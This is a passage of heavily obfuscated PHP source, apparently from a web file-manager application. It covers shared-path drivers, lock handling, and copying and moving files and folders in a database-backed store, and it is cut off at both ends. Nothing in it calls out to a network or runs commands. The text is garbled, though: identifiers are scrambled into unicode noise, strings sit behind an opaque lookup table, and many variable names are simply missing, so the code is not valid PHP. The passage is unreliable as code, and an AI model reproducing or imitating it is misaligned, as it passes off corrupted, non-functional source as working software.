$ӫ = '') { $this->_fileOut($ɔ, $񛨂, $, $ӫ, !0); } protected function _fileOutImage($݀֝, $⸄ = 250) { $ʑ =& $_SERVER[ܮ]; $쟩 = $this->model->pathInfo($݀֝); if ($쟩[$ʑ[500]] == $ʑ[91]) { show_json($ʑ[1539] . $݀֝, !1); } $ = $this->model->fileInfoGet($݀֝); $쟩[$ʑ[181]] = $[$ʑ[87]]; $GLOBALS[$ʑ[180]] = $쟩; IO::fileOutImage($[$ʑ[87]], $⸄); } public function fileOutImage($, $❲ = 250) { $this->_fileOutImage($, $❲); } public function fileOutImageServer($🱍, $ٮҊ = 250) { $this->_fileOutImage($🱍, $ٮҊ); } public function link($, $ = '') { $˚ = $this->model->fileInfoGet($); return IO::link($˚[$_SERVER[ܮ][87]], $); } protected function parse($䏄) { $ =& $_SERVER[ܮ]; if (strstr($䏄, $[8]) === !1) { return array($[508] => intval($䏄), $[87] => $[12], $[1535] => array()); } $Ө = explode($[8], trim($䏄, $[8])); if (count($Ө) < 2) { show_tips(clear_html($䏄) . $[1540]); } return array($[508] => intval($Ө[0]), $[87] => $Ө[1], $[1535] => array_slice($Ө, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($޽) { $this->pathParse = $޽; $this->model = Model($_SERVER[ܮ][1534]); } public function getPathRoot() { $׳ =& $_SERVER[ܮ]; return KodIO::makeShare($this->pathParse[$׳[487]], $this->pathParse[$׳[1360]]); } public function getPathOuter($) { $ =& $_SERVER[ܮ]; if (!$) { return $; } $ = $this->parse($); return trim(KodIO::makeShare($this->pathParse[$[487]], $[$[487]]), $[8]); } public function isParentOf($у, $н) { $Ƴ = IO::init($н); return $this->model->isParentOf($у, $Ƴ->path); } protected function infoParse($ܳľ, $Ɋ = false, $纙 = false) { $ո =& $_SERVER[ܮ]; static $ = array(); $ݢ = $this->pathParse[$ո[487]]; $و = trim($this->pathParse[$ո[1356]], $ո[8]); if (isset($[$و]) && is_array($[$و])) { return $[$و]; } $ = Action($ո[1541])->sharePathInfo($ݢ, $و, $Ɋ); $[$و] = $; return $; } public function infoFull($ˣҍ) { $ =& $_SERVER[ܮ]; $ = explode($[8], trim($ˣҍ, $[8])); if (count($) > 1) { $ = implode($[8], array_splice($, 1)); $Ō = $this->model->pathInfoByPath($[0], $); if (!$Ō) { return !1; } $this->pathParse[$[1356]] = $Ō[$[191]]; } return $this->infoParse($ˣҍ); } public function listAll($) { $ӂ =& $_SERVER[ܮ]; $ڮ߫ = IO::info($this->pathParse[$ӂ[87]]); if (!$ڮ߫) { return array(); } $߉ = $this->model->listAll($); $񡍥 = Model($ӂ[686])->getInfo($ڮ߫[$ӂ[687]]); foreach ($߉ as &$) { check_abort(); $[$ӂ[90]] = Action($ӂ[1541])->_shareItemeParse($[$ӂ[90]], $񡍥); } unset($); return $߉; } } goto c͕; c: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($͓օ) { $ҋ =& $_SERVER[ܮ]; if (!$this->allowLock()) { return; } $this->_lockCheck($ҋ[641], $͓օ); $ = 1; $this->_lockEvent($͓օ, array($ҋ[642], $ҋ[643]), $); $this->_lockParent($͓օ, array($ҋ[643]), $); $this->_lockEvent($͓օ, array($ҋ[644], $ҋ[645]), $); $this->_lockCheckEnd($ҋ[641], $͓օ); } public function lockCopyEnd($) { $ڤ߄ =& $_SERVER[ܮ]; if (!$this->allowLock()) { return; } $봭 = 0; $this->_lockEvent($, array($ڤ߄[642], $ڤ߄[643]), $봭); $this->_lockParent($, array($ڤ߄[643]), $봭); $this->_lockEvent($, array($ڤ߄[644], $ڤ߄[645]), $봭); } public function lockWriteStart($ޱ, $ = '') { $ =& $_SERVER[ܮ]; if (!$this->allowLock()) { return; } $this->_lockCheck($[642], $ޱ); $ = 1; $this->_lockKey($[646] . $ޱ . $[10] . $, $); $this->_lockEvent($ޱ, array($[641], $[643]), $); $this->_lockParent($ޱ, array($[641], $[643]), $); $this->_lockCheckEnd($[642], $ޱ); } public function lockWriteEnd($䯵, $ì݈ = '') { $Ђ =& $_SERVER[ܮ]; if (!$this->allowLock()) { return; } $ = 0; $this->_lockKey($Ђ[646] . $䯵 . $Ђ[10] . $ì݈, $); $this->_lockEvent($䯵, array($Ђ[641], $Ђ[643]), $); $this->_lockParent($䯵, array($Ђ[641], $Ђ[643]), $); } public function lockMoveStart($νָ) { $Ü =& $_SERVER[ܮ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ü[643], $νָ); $ؾ = 1; $this->_lockKey($Ü[647] . $νָ, $ؾ); $this->_lockEvent($νָ, array($Ü[641], $Ü[642]), $ؾ); $this->_lockParent($νָ, array($Ü[641], $Ü[643]), $ؾ); $this->_lockEvent($νָ, array($Ü[648], $Ü[644], $Ü[645]), $ؾ); $this->_lockCheckEnd($Ü[643], $νָ); } public function lockMoveEnd($) { $ꏆ =& $_SERVER[ܮ]; if (!$this->allowLock()) { return; } $շ = 0; $this->_lockKey($ꏆ[647] . $, $շ); $this->_lockEvent($, array($ꏆ[641], $ꏆ[642]), $շ); $this->_lockParent($, array($ꏆ[641], $ꏆ[643]), $շ); $this->_lockEvent($, array($ꏆ[648], $ꏆ[644], $ꏆ[645]), $շ); } private function _lockCheck($݋, $ԋ) { $ =& $_SERVER[ܮ]; $ψ = $this->sourceInfo($ԋ); $ܨ = $݋ . $[10] . $ԋ; $this->_lockTimeStart[$ܨ] = timeFloat(); if (!is_array($ψ)) { return; } $ǻޢ = LNG($[649]); CacheLock::setErrorMsg($[173] . htmlspecialchars($ψ[$[32]]) . $[175] . $ǻޢ); $this->_lockKey($ܨ, 1); $this->_lockKey($ܨ, 0); $ = array_reverse($this->parentLevelArray($ψ[$[604]])); foreach ($ as $) { $ܨ = $݋ . $[650] . $; if (CacheLock::lockGet($[651] . $ܨ)) { $ψ = $this->sourceInfo($); CacheLock::setErrorMsg($[173] . htmlspecialchars($ψ[$[32]]) . $[175] . $ǻޢ); $this->_lockKey($ܨ, 1); $this->_lockKey($ܨ, 0); } } } private function _lockCheckEnd($̦, $) { $ǅά =& $_SERVER[ܮ]; $ = $̦ . $ǅά[10] . $; CacheLock::setErrorMsg($ǅά[463]); if (!isset($this->_lockTimeStart[$])) { return; } $ܻͿ = timeFloat() - $this->_lockTimeStart[$]; unset($this->_lockTimeStart[$]); if ($ܻͿ > 0.5) { unset(self::$cacheSourceInfo[$ǅά[547] . $]); } $ = $this->sourceInfo($); if (!$) { show_json(LNG($ǅά[105]), !1); } } private function _lockParent($, $ʃ, $줏) { if (!$this->autoLockSet) { return; } $ = $this->sourceInfo($); if (!is_array($)) { return; } $Ⱦ = array_reverse($this->parentLevelArray($[$_SERVER[ܮ][604]])); foreach ($Ⱦ as $) { $this->_lockEvent($, $ʃ, $줏); } } private function _lockEvent($, $҅, $ڪ) { $ӕ =& $_SERVER[ܮ]; if (!$this->autoLockSet) { return; } foreach ($҅ as $䗴) { $ӊ = $䗴 . $ӕ[10] . $; if ($ڪ && CacheLock::lockGet($ӕ[651] . $ӊ)) { continue; } $this->_lockKey($ӊ, $ڪ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($, $␻ = 1) { $Ы = $_SERVER[ܮ][651] . md5($); if ($␻) { if (isset(self::$_lockItemArr[$Ы])) { return; } self::$_lockItemArr[$Ы] = 1; CacheLock::lock($Ы, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Ы])) { return; } unset(self::$_lockItemArr[$Ы]); CacheLock::unlock($Ы); } } public function isParentOf($ǿ, $) { $ =& $_SERVER[ܮ]; $Ƴ = $this->sourceInfo($ǿ); $ = $this->sourceInfo($); $ෟ = $Ƴ[$[604]] . $Ƴ[$[191]] . $[50]; $ = $[$[604]] . $[$[191]] . $[50]; $ = strpos($, $ෟ) === 0; return $; } private $targetIsDelete = 0; public function copy($, $, $ݗ = REPEAT_REPLACE, $옥 = '') { $ʭ =& $_SERVER[ܮ]; $ꔲ = $this->sourceInfo($); $ = $this->sourceInfo($); if (!$ꔲ || !$ || $[$ʭ[500]] != $ʭ[91]) { return !1; } if ($this->isParentOf($, $)) { return !1; } $ = $옥 ? $옥 : $ꔲ[$ʭ[32]]; $this->lockCopyStart($); $this->lockWriteStart($, $); $ĥ = array($ʭ[652] => array(), $ʭ[653] => array(), $ʭ[654] => array()); $this->targetIsDelete = intval($ꔲ[$ʭ[520]]); $⾨ = $this->fileNameExistAuto($, $ꔲ); $и = $this->_copy($, $, $ݗ, $ĥ, !0, $옥); $this->_childrenListClear(); $this->lockCopyEnd($); $this->lockWriteEnd($, $); if ($ꔲ[$ʭ[500]] == $ʭ[91] && $⾨ == $и) { $this->folderSizeResetChildren($⾨); } Model($ʭ[471])->addAll($ĥ[$ʭ[653]], array(), !0); if ($⾨ != $и || $ꔲ[$ʭ[500]] == $ʭ[91]) { Model($ʭ[655])->eventCopy($и); } $this->saveAll($ĥ[$ʭ[654]]); Model($ʭ[230])->linkAdd($ĥ[$ʭ[652]]); $this->folderSizeReset($); $this->updateModifyTime($); return $и; } private function _copy($˥, $ؗ, $㥆, &$, $ʕ, $ = '') { $ϊ =& $_SERVER[ܮ]; $ܘ = $this->sourceInfoCache($˥); $ = $ܘ[$ϊ[500]] == $ϊ[91]; $ = $ ? $ : $ܘ[$ϊ[32]]; $Պɒ = $this->fileNameExistAuto($ؗ, $ܘ); if ($ʕ) { $this->_childrenAllMake($˥); if ($ && $Պɒ) { $this->_childrenAllMake($Պɒ); } } if (!$Պɒ) { return $this->_copyCreate($˥, $ؗ, $, $); } $¯ = $Պɒ; if ($) { if ($㥆 == REPEAT_RENAME_FOLDER) { $ = $this->fileNameAutoCache($ؗ, $, $㥆, $); $¯ = $this->_copyCreate($˥, $ؗ, $, $); } else { $ϱ٩ = $this->_childrenList($˥); foreach ($ϱ٩ as $ܩ) { $this->_copy($ܩ[$ϊ[191]], $Պɒ, $㥆, $, !1); } } } else { if ($㥆 == REPEAT_RENAME || $㥆 == REPEAT_RENAME_FOLDER) { $ = $this->fileNameAutoCache($ؗ, $, $㥆, $); $¯ = $this->_copyCreate($˥, $ؗ, $, $); } else { if ($㥆 == REPEAT_REPLACE) { $ = $this->sourceInfoCache($Պɒ); $ = $this->fileHistory($, $ܘ[$ϊ[557]], $ܘ[$ϊ[79]]); if ($) { $[$ϊ[652]][] = $ܘ[$ϊ[557]]; } } else { if ($㥆 == REPEAT_SKIP) { } } } Hook::trigger($ϊ[656], array($ϊ[657], $ܘ, 0)); } return $¯; } private function _copyCreate($ΒČ, $, $ڙ֠, &$) { $ˢ =& $_SERVER[ܮ]; $ޘ = $this->sourceInfoCache($ΒČ); $ = $this->sourceInfoCache($); $ = $this->_makeItemData($ޘ, $, $ڙ֠); Hook::trigger($ˢ[658], $); Hook::trigger($ˢ[659], array($ˢ[660], $, 0)); $կ = $this->add($); $ƌ = array($ˢ[191] => $կ, $ˢ[32] => $ڙ֠); $this->_copyApplyMeta($ƌ, $); if ($ޘ[$ˢ[500]] != $ˢ[91]) { $[$ˢ[652]][] = $ޘ[$ˢ[557]]; return $կ; } $ȷ۽ = array(); $ = array(); $this->_childrenListAll($ΒČ, $ȷ۽); $ҽ = count($ȷ۽); if ($ҽ == 0) { return $կ; } $ = $this->sourceInfo($կ); foreach ($ȷ۽ as $ɻ) { $ = $this->_makeItemData($ɻ, $, $ɻ[$ˢ[32]]); $[$ˢ[604]] = $ɻ[$ˢ[604]]; $[] = $; } $this->chunkEventSet($ˢ[661], array($ˢ[662], $, $ҽ)); $this->addAll($, array(), !1); $ʛ요 = $this->where(array($ˢ[190] => $կ))->select(); $Ū = $this->_childrenMakeRelation($ȷ۽, $ʛ요); $Ū[$ΒČ] = $կ; $ۍ = array(); $ = array(); foreach ($ʛ요 as $ɻ) { $侓ɝ = $ɻ[$ˢ[191]]; $ = $this->_childrenMatch($Ū, $ɻ, $); $ۍ[] = array($ˢ[191], $侓ɝ, $ˢ[190], $[$ˢ[190]]); $[] = array($ˢ[191], $侓ɝ, $ˢ[604], $[$ˢ[604]]); $this->_copyApplyMeta($ɻ, $); if ($ɻ[$ˢ[500]] != $ˢ[91]) { $[$ˢ[652]][] = $ɻ[$ˢ[557]]; } } $this->chunkEventSet($ˢ[663], array($ˢ[664], $, $ҽ)); $this->saveAll($ۍ); $this->chunkEventSet($ˢ[665], array($ˢ[666], $, $ҽ)); $this->saveAll($); return $կ; } private function _childrenMakeRelation($, $) { $̠ =& $_SERVER[ܮ]; $ = array(); $գݝ = array(); foreach ($ as $鳏) { $ţ = $鳏[$̠[32]] . $̠[8] . $鳏[$̠[604]]; $[$ţ] = $鳏[$̠[191]]; } foreach ($ as $鳏) { $ţ = $鳏[$̠[32]] . $̠[8] . $鳏[$̠[604]]; $ = $[$ţ]; $գݝ[$] = $鳏[$̠[191]]; } return $գݝ; } private function _childrenMatch($, $޺, $ß) { $˒ =& $_SERVER[ܮ]; $Èֆ = $ß[$˒[604]]; $ = $this->parentLevelArray($޺[$˒[604]]); foreach ($ as $) { if (isset($[$])) { $Èֆ .= $[$] . $˒[667]; } } $Èֆ = rtrim($Èֆ, $˒[50]) . $˒[50]; $ = $this->parentLevelArray($Èֆ); $Ҩ҄ = $[count($) - 1]; return array($˒[190] => $Ҩ҄, $˒[604] => $Èֆ); } private function _makeItemData($, $֟ӛ, $ׄ) { $͕ =& $_SERVER[ܮ]; $ = array($͕[668] => $[$͕[500]], $͕[509] => $ׄ, $͕[669] => $[$͕[501]] ? $[$͕[501]] : $͕[12], $͕[558] => $[$͕[557]] ? $[$͕[557]] : 0, $͕[640] => $[$͕[79]] ? $[$͕[79]] : 0, $͕[670] => intval($֟ӛ[$͕[188]]), $͕[671] => intval($֟ӛ[$͕[589]]), $͕[672] => intval(USER_ID), $͕[673] => intval(USER_ID), $͕[492] => intval($֟ӛ[$͕[191]]), $͕[674] => $֟ӛ[$͕[604]] . $֟ӛ[$͕[191]] . $͕[50], $͕[513] => $[$͕[88]] ? $[$͕[88]] : time(), $͕[519] => 0, $͕[675] => $͕[12]); return $; } private function _copyApplyMeta($ݘ, &$ֲ) { $ğ =& $_SERVER[ܮ]; $آه = $ݘ[$ğ[191]]; $鷧 = $ݘ[$ğ[32]]; if (!isset($ݘ[$ğ[676]]) || !$ݘ[$ğ[676]] || $ݘ[$ğ[676]] == $ğ[228]) { $ֲ[$ğ[654]][] = array($ğ[191], $آه, $ğ[676], short_id($آه)); } if (Input::check($鷧, $ğ[677])) { $ֲ[$ğ[653]][] = array($ğ[191] => $آه, $ğ[95] => $ğ[552], $ğ[451] => str_replace($ğ[53], $ğ[12], Pinyin::get($鷧))); $ֲ[$ğ[653]][] = array($ğ[191] => $آه, $ğ[95] => $ğ[551], $ğ[451] => Pinyin::get($鷧, $ğ[678])); } $ֲ[$ğ[653]][] = array($ğ[191] => $آه, $ğ[95] => $ğ[531], $ğ[451] => KodSort::makeStr($鷧)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($) { $މѥ =& $_SERVER[ܮ]; $˗ = $this->sourceInfo($); $ = $މѥ[679]; $ = array($މѥ[604] => array($މѥ[635], $˗[$މѥ[604]] . $ . $މѥ[636]), $މѥ[520] => $this->targetIsDelete); $ÿò = $this->field($)->where($)->select(); if (!$ÿò) { return; } $ÿò = array_to_keyvalue($ÿò, $މѥ[191]); foreach ($ÿò as $) { $ = $[$މѥ[190]]; $ = $[$މѥ[191]]; if (!isset($this->_childrenListCache[$]) && $[$މѥ[500]] == $މѥ[91]) { $this->_childrenListCache[$] = array(); } if (!isset($this->_childrenListCache[$])) { $this->_childrenListCache[$] = array(); } $this->_childrenListCache[$][$] = $; $this->_childrenItemCache[$] = $; } } private function _childrenListAll($, &$Ǹ) { $ =& $_SERVER[ܮ]; if (!isset($this->_childrenListCache[$])) { return; } $ = $this->_childrenListCache[$]; foreach ($ as $ڑ => $щ) { $Ǹ[$ڑ] = $щ; if ($щ[$[500]] == $[91]) { $this->_childrenListAll($ڑ, $Ǹ); } } } private function sourceInfoCache($) { if (isset($this->_childrenItemCache[$])) { return $this->_childrenItemCache[$]; } return $this->sourceInfo($); } private function _childrenList($ܕ) { if (isset($this->_childrenListCache[$ܕ])) { return $this->_childrenListCache[$ܕ]; } return $this->_childrenListSelect($ܕ); } private function _childrenListSelect($ߔ) { $Ъ =& $_SERVER[ܮ]; $ = array($Ъ[190] => $ߔ, $Ъ[520] => $this->targetIsDelete); $ν = $this->where($)->select(); $ν = $ν ? $ν : array(); $ = array_to_keyvalue($ν, $Ъ[191]); $this->_childrenListCache[$ߔ] = $; foreach ($ as $ߔ => $ږ) { $this->_childrenItemCache[$ߔ] = $ږ; } return $; } private function fileNameExistAuto($, $Ή) { $ =& $_SERVER[ܮ]; if ($Ή[$[520]] == $[91]) { return $this->fileNameExist($, $Ή[$[32]]); } return $this->fileNameExistCache($, $Ή[$[32]]); } private function fileNameExistCache($, $) { $ =& $_SERVER[ܮ]; $ = strtolower($); $Փ = $this->_childrenList($); foreach ($Փ as $) { if ($ == strtolower($[$[32]])) { return $[$[191]]; } } return !1; } private function fileNameAutoCache($҅, $њ, $χ, $) { $е =& $_SERVER[ܮ]; $ɾ = $this->_childrenList($҅); $ = array_to_keyvalue($ɾ, $е[12], $е[32]); return $this->fileNameAutoGet($, $њ, $χ, $); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($孿, $ʍɨ, $ = REPEAT_REPLACE, $Ь = '') { $ =& $_SERVER[ܮ]; $߯ = $this->sourceInfo($孿); $ = $this->sourceInfo($ʍɨ); if ($߯[$[190]] == $[$[191]]) { if ($߯[$[520]] == $[91]) { Model($[518])->restore(array($孿)); } if (!$Ь || $Ь == $߯[$[32]]) { return $孿; } } $ = $this->pathInfoMore($孿); if ($this->isParentOf($孿, $ʍɨ)) { return !1; } if (!$߯ || !$ || $[$[500]] != $[91]) { return !1; } Hook::trigger($[680], $); $this->targetIsDelete = intval($߯[$[520]]); if ($߯[$[190]] == $ʍɨ && $Ь != $߯[$[32]]) { $ = $this->fileNameExist($ʍɨ, $Ь); if ($ && $߯[$[500]] == $[228]) { $핢 = $this->sourceInfo($); $ = $this->fileHistory($핢, $߯[$[557]], $߯[$[79]]); if (!$) { Model($[560])->remove($߯[$[557]]); } $this->removeNow($孿, !1); $this->folderSizeReset($ʍɨ); Hook::trigger($[681], $); return $; } } $ = $Ь ? $Ь : $߯[$[32]]; $this->lockMoveStart($孿); $this->lockWriteStart($ʍɨ, $); $Ӵ = array($[652] => array(), $[682] => !1); $this->clearShare($孿, $ʍɨ); $勆 = $this->fileNameExistAuto($ʍɨ, $߯); $ = $this->_move($孿, $ʍɨ, $, $Ӵ, $Ь); $this->sourceCacheClear(); if ($߯[$[500]] == $[91] && $勆) { $this->folderSizeResetChildren($); } Model($[230])->linkAdd($Ӵ[$[652]]); if ($ && $勆 && $Ӵ[$[682]]) { $ = $߯[$[500]] == $[91] ? $this->_childrenListSelect($孿) : !1; $ȷ = $ && count($) > 0 ? !0 : !1; $this->removeNow($孿, $ȷ); } $this->lockMoveEnd($孿); $this->lockWriteEnd($ʍɨ, $); $this->folderSizeReset($߯[$[190]]); $this->folderSizeReset($ʍɨ); $݂ = array($߯[$[190]], $ʍɨ); if ($߯[$[500]] == $[91]) { $݂[] = $孿; } $this->updateModifyTime($݂); Model($[655])->eventMove($孿, $߯[$[190]], $ʍɨ); Hook::trigger($[681], $); return $; } private function _move($ɞ, $, $ܴ, &$Ȼ, $ǹڬ = '') { $֊ =& $_SERVER[ܮ]; $ = $this->sourceInfo($ɞ); $帔 = $[$֊[500]] == $֊[91]; $ژ = $ǹڬ ? $ǹڬ : $[$֊[32]]; $Ӊ = $this->fileNameExistAuto($, $); $this->lockMoveStart($ɞ); $this->lockWriteStart($, $ژ); if (!$Ӊ) { return $this->_moveForce($ɞ, $, $ژ); } $ = $Ӊ; $ = !1; if ($帔) { if ($ܴ == REPEAT_RENAME_FOLDER) { $ژ = $this->fileNameAuto($, $ژ, $ܴ, $帔); $ = $this->_moveForce($ɞ, $, $ژ); } else { $󔬓 = $this->_childrenListSelect($ɞ); foreach ($󔬓 as $) { $ = REPEAT_REPLACE; $this->_move($[$֊[191]], $Ӊ, $, $Ȼ); } $ = !0; } } else { if ($ܴ == REPEAT_RENAME || $ܴ == REPEAT_RENAME_FOLDER) { $ژ = $this->fileNameAuto($, $ژ, $ܴ, $帔); $ = $this->_moveForce($ɞ, $, $ژ); } else { $߻ȣ = $this->sourceInfoCache($Ӊ); $푸 = $this->fileHistory($߻ȣ, $[$֊[557]], $[$֊[79]]); if ($푸) { $Ȼ[$֊[652]][] = $[$֊[557]]; } $ = !0; } } if ($) { $Ȼ[$֊[682]] = !0; } return $; } private function _moveForce($Ũ, $풄, $鈉ۄ) { $Ή =& $_SERVER[ܮ]; $ȴ = $this->sourceInfo($Ũ); $ꤸ = $this->sourceInfo($풄); $Ƥ = $ȴ[$Ή[500]] == $Ή[91]; $Ѩר = array($Ή[492] => $ꤸ[$Ή[191]], $Ή[674] => $ꤸ[$Ή[604]] . $ꤸ[$Ή[191]] . $Ή[50], $Ή[670] => $ꤸ[$Ή[188]], $Ή[671] => $ꤸ[$Ή[589]], $Ή[673] => USER_ID, $Ή[509] => $鈉ۄ); $ؖè = $ȴ[$Ή[188]] == SourceModel::TYPE_GROUP && $ꤸ[$Ή[188]] == SourceModel::TYPE_GROUP && $ȴ[$Ή[589]] == $ꤸ[$Ή[589]]; if (!$ؖè && $this->moveClearAuth) { Model($Ή[587])->authClear($Ũ); } $ = $ȴ[$Ή[520]] == $Ή[91] && $ꤸ[$Ή[520]] != $Ή[91]; if ($) { $Ѩר[$Ή[519]] = 0; } if ($Ƥ) { $ߏ = array($Ή[674] => array($Ή[635], $ȴ[$Ή[604]] . $ȴ[$Ή[191]] . $Ή[636])); $ = $ȴ[$Ή[604]] . $ȴ[$Ή[191]] . $Ή[50]; $Ș = $ꤸ[$Ή[604]] . $ꤸ[$Ή[191]] . $Ή[50] . $ȴ[$Ή[191]] . $Ή[50]; $ = array($Ή[674] => array($Ή[683], "\x72\x65\160\x6c\141\x63\x65\50\160\x61\x72\x65\x6e\164\x4c\145\166\x65\154\54\47{$}\x27\54\47{$Ș}\x27\x29"), $Ή[670] => $ꤸ[$Ή[188]], $Ή[671] => $ꤸ[$Ή[589]]); if ($) { $[$Ή[519]] = 0; } $this->where($ߏ)->data($)->save(); } $this->where(array($Ή[506] => $Ũ))->data($Ѩר)->save(); return $Ũ; } private function clearShare($, $Ϛ) { $͕ =& $_SERVER[ܮ]; $ĕ = $this->sourceInfo($); $ϕ = $this->sourceInfo($Ϛ); if ($ĕ[$͕[589]] == $ϕ[$͕[589]] && $ĕ[$͕[188]] == $͕[684]) { return; } $Ϯ右 = array($͕[604] => array($͕[635], $ĕ[$͕[604]] . $ . $͕[636])); $݆ڽ = $this->field($͕[506])->where($Ϯ右)->getField($͕[191], !0); if (!$݆ڽ) { return; } $Ϯ右 = array($͕[191] => array($͕[7], $݆ڽ), $͕[685] => 1); $Ѽ = Model($͕[686])->field($͕[687])->where($Ϯ右)->select(); if (!$Ѽ) { return; } $Ѽ = array_to_keyvalue($Ѽ, $͕[12], $͕[687]); $Ϯ右 = array($͕[687] => array($͕[7], $Ѽ)); Model($͕[686])->where($Ϯ右)->save(array($͕[685] => 0)); Model($͕[688])->where($Ϯ右)->delete(); } public function copyFolderFromIO($, $Ɨę, $ۋѕ, $, $ӝ֥, $儀 = false) { $ۥ =& $_SERVER[ܮ]; $ = array($ۥ[653] => array(), $ۥ[654] => array(), $ۥ[652] => array(), $ۥ[689] => array()); $ = $儀 ? $儀 : $->pathThis($Ɨę); $ = $this->fileNameExist($ۋѕ, $); $Ҩқ = $this->mkdir($ۋѕ, $, $); if (!$ || $ == REPEAT_RENAME_FOLDER) { $ = !1; } if ($) { $this->_childrenAllMake($); } Hook::trigger($ۥ[690]); $ʇ = KodIO::ioFileDriverGet($ۥ[498] . $ۋѕ . $ۥ[402]); $this->_copyChildTo($, $Ɨę, $Ҩқ, $, $, $ӝ֥, $ʇ); Hook::trigger($ۥ[691]); if ($Ҩқ) { $this->folderSizeResetChildren($Ҩқ); } $this->_childrenListClear(); Model($ۥ[471])->addAll($[$ۥ[653]], array(), !0); Model($ۥ[655])->eventCopy($Ҩқ); $this->saveAll($[$ۥ[654]]); Model($ۥ[560])->linkAdd($[$ۥ[652]]); Model($ۥ[560])->remove($[$ۥ[689]]); $this->folderSizeReset($ۋѕ); $this->updateModifyTime($ۋѕ); return $Ҩқ; } private function _copyChildTo($Ԡ, $, $ۢ, $, &$׸, $, $醙) { $ֶ =& $_SERVER[ܮ]; $˹ = $this->sourceInfoCache($ۢ); $ = $Ԡ->listPath($); $ = $ ? $ : array($ֶ[86] => array(), $ֶ[85] => array()); $杔 = array_merge($[$ֶ[86]], $[$ֶ[85]]); $ߜ۝ = $this->_addFiles($Ԡ, $醙, $[$ֶ[86]], $); $ຆ = array(); foreach ($杔 as &$˕) { if (isset($ߜ۝[$˕[$ֶ[32]]])) { $˕ = $ߜ۝[$˕[$ֶ[32]]]; } $˕[$ֶ[500]] = $˕[$ֶ[33]] == $ֶ[78]; $˕[$ֶ[501]] = substr(_get($˕, $ֶ[166], $ֶ[12]), 0, 10); $˕[$ֶ[79]] = _get($˕, $ֶ[79], 0); $˕[$ֶ[557]] = _get($˕, $ֶ[557], 0); if (!isset($˕[$ֶ[692]]) && $˕[$ֶ[557]]) { $׸[$ֶ[689]][] = $˕[$ֶ[557]]; } if ($) { $ = $this->fileNameExistCache($ۢ, $˕[$ֶ[32]]); if ($) { if ($˕[$ֶ[500]] || $ == REPEAT_SKIP) { continue; } if ($ == REPEAT_REPLACE) { $Ԧ = $this->sourceInfoCache($); $ = $this->fileHistory($Ԧ, $˕[$ֶ[557]], $˕[$ֶ[79]]); if ($) { $׸[$ֶ[652]][] = $˕[$ֶ[557]]; } continue; } else { if ($ == REPEAT_RENAME) { $˕[$ֶ[32]] = $this->fileNameAutoCache($ۢ, $˕[$ֶ[32]], $, !1); } } } } if (!$˕[$ֶ[500]] && $˕[$ֶ[557]] == 0) { continue; } if (!$˕[$ֶ[500]] && $˕[$ֶ[557]]) { $׸[$ֶ[652]][] = $˕[$ֶ[557]]; } $ຆ[] = $this->_makeItemData($˕, $˹, $˕[$ֶ[32]]); } unset($˕); if (!empty($ຆ)) { $this->addAll($ຆ); $this->_childrenListSelect($ۢ); } $ = $this->_childrenList($ۢ); $ = array_to_keyvalue($, $ֶ[32]); foreach ($杔 as $˕) { $Ԧ = $[$˕[$ֶ[32]]]; $ = $Ԧ[$ֶ[191]]; $this->_copyApplyMeta($Ԧ, $׸); if ($˕[$ֶ[33]] == $ֶ[78]) { $˕[$ֶ[87]] = $Ԡ->getPathInner($˕[$ֶ[87]]); $this->_copyChildTo($Ԡ, $˕[$ֶ[87]], $, $, $׸, $, $醙); } } } private function _addFiles($߃, $, $, $Ϡ) { $ =& $_SERVER[ܮ]; if (!$ || count($) == 0) { return array(); } $ = array(); foreach ($ as &$݂蔁) { Hook::trigger($[693], $݂蔁); $݂蔁[$[87]] = $߃->getPathInner($݂蔁[$[87]]); $ = $߃->hashSimple($݂蔁[$[87]]); $˹ = $߃->hashMd5($݂蔁[$[87]]); if (strlen($˹) > 10 && !isset($[$˹])) { $[$˹] = array(); } $݂蔁[$[694]] = $; $݂蔁[$[563]] = $˹; $[$˹][] =& $݂蔁; if (count($[$˹]) > 1) { $݂蔁[$[692]] = !0; } Hook::trigger($[695], $݂蔁); } unset($݂蔁); $ԇ = array($[563] => array($[7], array_keys($))); $ = Model($[696]); $ = $->where($ԇ)->select(); $ = $ ? $ : array(); foreach ($ as $֡) { if (!isset($[$֡[$[563]]])) { continue; } $ = $[$֡[$[563]]]; foreach ($ as &$݂蔁) { $݂蔁[$[557]] = $֡[$[557]]; $݂蔁[$[692]] = !0; } unset($݂蔁); } $ = array(); foreach ($ as $Ј) { Hook::trigger($[697], $Ј); if (isset($Ј[$[692]]) && $Ј[$[692]]) { Hook::trigger($[698], $Ј); continue; } $ݴ = $߃->getPathInner($Ј[$[87]]); $͖ = $->addFileMake($ݴ, $, $Ј[$[79]], $Ј[$[694]], $Ј[$[563]], $Ј[$[32]], $Ϡ); Hook::trigger($[698], $Ј); if (!is_array($͖)) { continue; } $[] = $͖; } $->addAll($); $ԇ = array($[563] => array($[7], array_keys($))); $ = $->where($ԇ)->select(); $ = $ ? $ : array(); foreach ($ as $֡) { if (!isset($[$֡[$[563]]])) { continue; } $ =& $[$֡[$[563]]]; foreach ($ as &$݂蔁) { $݂蔁[$[557]] = $֡[$[557]]; } unset($݂蔁); } $̷υ = array(); foreach ($ as $) { $̷υ[$[$[32]]] = $; } return $̷υ; } } define($_SERVER[ܮ][699], $_SERVER[ܮ][700]); $okeavrpjui = $_SERVER[ܮ][701]; goto F; F՗: class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\155\145\156\x74"; protected $tableMeta = array("\x74\141\142\154\145\x4e\141\x6d\x65" => "\x63\x6f\x6d\155\145\156\164\137\155\145\x74\141", "\155\145\164\x61\106\151\x65\x6c\x64" => "\x63\157\x6d\x6d\x65\156\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function 